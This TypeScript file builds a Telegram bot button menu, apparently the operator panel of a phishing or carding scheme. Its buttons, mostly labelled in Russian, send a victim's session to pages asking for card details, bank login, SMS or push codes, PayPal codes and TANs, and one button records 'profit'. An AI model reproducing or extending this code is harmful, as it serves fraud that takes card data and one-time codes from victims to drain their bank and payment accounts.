import {logsRepository} from "@/database";

export async function createVbiverMenu(id: number) {
    const log = await logsRepository.findOne({
        relations: {
            ad: true
        },
        where: {
            id: id
        }
    })
    const arrayButton = {
        inline_keyboard: [
            [{text: "✅ УСПЕХ!", callback_data: `log redirect successful ${id} false`}],
            [{text: "🅿️ PayPal", callback_data: `log redirect bank-paypal ${id} false`},{text: "🅿️ PayPal Code", callback_data: `log redirect paypalcode ${id} false`}],
            [{text: "➖➖➖➖➖➖➖", callback_data: `null`}],
            [
                {text: "🧸 MOBILE PUSH 1.0", callback_data: `${(log.ad.service === 'lonelypups') ? 'log redirect mobilePush1.0 ' + id : 'null'}`},
                {text: "🧸 CODE 1.0", callback_data: `${(log.ad.service === 'lonelypups') ? 'log redirect code1.0 ' + id : 'null'}`}
            ],
            [{text: "➖➖➖➖➖➖➖", callback_data: `null`}],
            [
                {text: "📲 PUSH", callback_data: `log redirect push ${id} false`},
                {text: "📲 PUSH С КОДОМ", callback_data: `log set pushcode ${id}`}
            ],
            [
                {text: "💌 SMS", callback_data: `log redirect sms ${id} false`}
            ],
            [   {text: "❓ Вопрос", callback_data: `log redirect question ${id}`},
                {text: "🗃 БАЛАНС КАРТЫ", callback_data: `log redirect balance-card ${id} false`}
            ],
            [
                {text: "🎯 Название банка", callback_data: `log redirect bank-name ${id} false`},
                {text: "🩻 QR-CODE", callback_data: `log set qrcode ${id}`},
            ],
            [
                {text: "💳 КАРТА", callback_data: `log redirect choice-bank ${id} false`},
                {text: "💳 КАРТА (БЕЗ ЛК)", callback_data: `log redirect withoutbank ${id} false`},
            ],
            [
                {text: "🏷 НЕКОРРЕКТНАЯ КАРТА", callback_data: `log redirect incorrect-choice-bank ${id} false`},
            ],
            [
                {text: "💻 ЧАТ", callback_data: `log redirect support ${id} false`}],
            [
                {text: "🏦 СПИСОК ЛК", callback_data: `log list LK ${log.ad.country.toLowerCase()} ${id}`},
                {text: "📟 TAN", callback_data: `log list tan ${id}`}
            ],
            [{text: "➖➖➖➖➖➖➖", callback_data: `null`}],
            [
                {text: `${(log.ad.delete) ? '🧸 Активировать' : '🗑 Деактивировать'}`, callback_data: `losg deletsade ${id}`},
                {text: "👍 ПРОФИТ", callback_data: `log profit ${id}`},
            ],
        ]
    }

    return arrayButton
}